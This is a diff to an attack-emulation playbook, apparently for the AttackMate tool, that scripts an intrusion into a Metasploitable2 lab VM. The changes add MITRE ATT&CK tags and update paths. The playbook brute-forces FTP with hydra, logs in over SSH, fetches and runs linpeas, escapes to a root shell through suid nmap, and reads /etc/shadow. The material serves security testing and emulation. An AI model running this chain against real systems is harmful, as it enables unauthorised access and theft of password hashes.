@@ -1,5 +1,5 @@
 #
-# Author: Wolfgang Hotwagner
+# Author: Wolfgang Hotwagner, Erik Grafendorfer
 # Description:
 #     This playbook perfoms the following attack-steps:
 #     1. scan the metasploitable-vm
@@ -16,15 +16,23 @@
 #     4. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 172.17.0.106
-  PASSWDLIST: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+  METASPLOITABLE: 192.168.0.146
+  PASSWDLIST: /snap/seclists/current/Passwords/Common-Credentials/darkweb2017_top-1000.txt
 
 commands:
   - type: shell
     cmd: nmap -A -T4 $METASPLOITABLE
+    metadata:
+      description: "Execute a portscan against the target"
+      techniques: "T1595,T1592.002"
+      tactics: "Reconnaissance"
 
   - type: shell
     cmd: hydra -l user -P $PASSWDLIST $METASPLOITABLE ftp
+    metadata:
+      description: "Brute-force FTP-password"
+      techniques: "T1078.002,T1110.001,T1133"
+      tactics: "Initial Access"
 
   # Parse the output of hydra and isolate the bruteforced password.
   # The password will be stored in the variable $USERPW
@@ -32,10 +40,14 @@ commands:
     cmd: ".*login: user.+password: (.+)"
     output:
       USERPW: "$MATCH_0"
+    metadata:
+      description: "Parse the password from the result of the bruteforce attack"
 
   # Print out the password
   - type: debug
     cmd: "Password found: $USERPW"
+    metadata:
+      description: "Print parsed password"
 
   # Login via ssh using the bruteforced password
   - type: ssh
@@ -43,15 +55,24 @@ commands:
     username: user
     password: "$USERPW"
     hostname: $METASPLOITABLE
+    interactive: False
     creates_session: "foothold"
+    metadata:
+      description: "Login via ssh using a valid account and check the current user"
+      techniques: "T1078.002,T1033"
+      tactics: "Initial Access,Discovery"
 
   # create a local tempfile for linpeas
   - type: mktemp
     variable: LINPEAS
+    metadata:
+      description: "Create temporary directory for linpeas results"
 
   # download linpeas locally
   - type: shell
     cmd: wget -O $LINPEAS https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+    metadata:
+      description: "Download linpeas locally"
 
   # upload linpeas using the previously created ssh-session
   - type: sftp
@@ -63,22 +84,34 @@ commands:
 
   - type: debug
     cmd: "Executing LinPeas. This will take a while. Please be patient"
+    metadata:
+      description: "Print warning"
 
   # Execute linpeas in interactive mode. The command_timeout
   # is set to 0 because linpeas runs very long without any
   # output. AttackMate will run until the output of the commands
   # ends with a prompt.
+
   - type: ssh
-    cmd: "bash /tmp/linpeas.sh\n"
+    cmd: "/tmp/linpeas.sh -s -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,software_information,interesting_perms_files,interesting_files,api_keys_regex \n"
+    session: "foothold"
     save: /tmp/linpeas_output.txt
     exit_on_error: False
     interactive: True
     command_timeout: 0
+    metadata:
+      description: "Enumerate system using linpeas to find privilege escalation weaknesses"
+      tactics: "Discovery"
+      techniques: "T1087,T1083,T1201,T1069,T1057,T1518,T1082,T1614,T1016,T1049,T1033,T1007,T1615"
 
   # prepare the privilege escalation
   - type: ssh
     cmd: echo "os.execute('/bin/sh')" > somefile
     session: foothold
+    metadata:
+      description: "Prepare exploit for privilege escalation"
+      techniques: "T1548"
+      tactics: "Privilege Escalation"
 
   # nmap has suid-permissions. we can escape by
   # executing our payload as a script. We need
@@ -88,11 +121,19 @@ commands:
     cmd: "nmap --script=./somefile localhost\n"
     session: foothold
     interactive: True
+    metadata:
+      description: "Escalate privileges using wrong permissions on nmap"
+      techniques: "T1548"
+      tactics: "Privilege Escalation"
 
   - type: ssh
     cmd: "id\n"
     session: foothold
     interactive: True
+    metadata:
+      description: "Check current user"
+      techniques: "T1033"
+      tactics: "Discovery"
 
   # proof that we have root permissions by
   # reading out the shadow-file
@@ -100,3 +141,7 @@ commands:
     cmd: "grep root /etc/shadow\n"
     session: foothold
     interactive: True
+    metadata:
+      description: "Read out password hashes"
+      techniques: "T1003.008"
+      tactics: "Credential Access"
